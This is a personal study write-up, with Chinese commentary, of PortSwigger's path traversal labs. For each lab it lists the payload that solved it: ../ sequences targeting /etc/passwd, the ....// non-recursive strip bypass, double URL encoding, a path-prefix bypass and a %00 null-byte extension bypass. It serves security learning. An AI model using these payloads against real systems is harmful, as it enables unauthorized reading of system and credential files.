---
title: Path traversal
description: Path traversal
last_update:
  date: "2025-09-11T08:00:00+08:00"
---

## Lab: File path traversal, simple case

| Dimension | Description                                                                                         |
| --------- | --------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-path-traversal#reading-arbitrary-files-via-path-traversal |
| Lab       | https://portswigger.net/web-security/file-path-traversal/lab-simple                                 |

`/image?filename=../../../etc/passwd`

## Lab: File path traversal, traversal sequences blocked with absolute path bypass

| Dimension | Description                                                                                                            |
| --------- | ---------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-path-traversal#common-obstacles-to-exploiting-path-traversal-vulnerabilities |
| Lab       | https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass                                      |

`/image?filename=/etc/passwd`

## Lab: File path traversal, traversal sequences stripped non-recursively

| Dimension | Description                                                                                                            |
| --------- | ---------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-path-traversal#common-obstacles-to-exploiting-path-traversal-vulnerabilities |
| Lab       | https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively                        |

假設後端有以下邏輯

```js
path.replaceAll("../", "");
```

那我們可以構造

```
....//
```

結果是

```js
"....//".replaceAll("../", "") => "../"
```

簡單來說，就是利用後端過濾 traversal sequences 的漏洞來達成 Path Traversal，但不同程式語言轉義反斜線 `\` 的方式不一樣，所以要多嘗試(?)

`/image?filename=....//....//....//etc/passwd`

一次成功，這個 Bypass 技巧我之前都沒想過，算是有學到新的技巧，讚讚

## Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

| Dimension | Description                                                                                                            |
| --------- | ---------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-path-traversal#common-obstacles-to-exploiting-path-traversal-vulnerabilities |
| Lab       | https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode                                    |

1.

```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

`"No such file"`

2. double encode `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`

## Lab: File path traversal, validation of start of path

| Dimension | Description                                                                                                            |
| --------- | ---------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-path-traversal#common-obstacles-to-exploiting-path-traversal-vulnerabilities |
| Lab       | https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path                                    |

`/var/www/images/../../../etc/passwd`

## Lab: File path traversal, validation of file extension with null byte bypass

| Dimension | Description                                                                                                            |
| --------- | ---------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-path-traversal#common-obstacles-to-exploiting-path-traversal-vulnerabilities |
| Lab       | https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass                  |

null byte

```js
// Hexadecimal escape sequence
const nullByte1 = "\x00";

// Unicode escape sequence
const nullByte2 = "\u0000";

// Character code
const nullByte3 = String.fromCharCode(0);

// 驗證它們都相同
console.log(nullByte1 === nullByte2); // true
console.log(nullByte1 === nullByte3); // true
console.log(nullByte1.charCodeAt(0)); // 0

// Encode Null Byte
encodeURIComponent(String.fromCharCode(0)); // %00
```

`../../../etc/passwd%00.jpg`

## 小結

Path Traversal 的 Labs 一下子就沒了，但有學到一些新的技巧，算是有收穫，這個系列的 Labs 沒有 Expert 等級的，可能是因為 Path Traversal 比較單純（？

## 參考資料

- https://portswigger.net/web-security/file-path-traversal
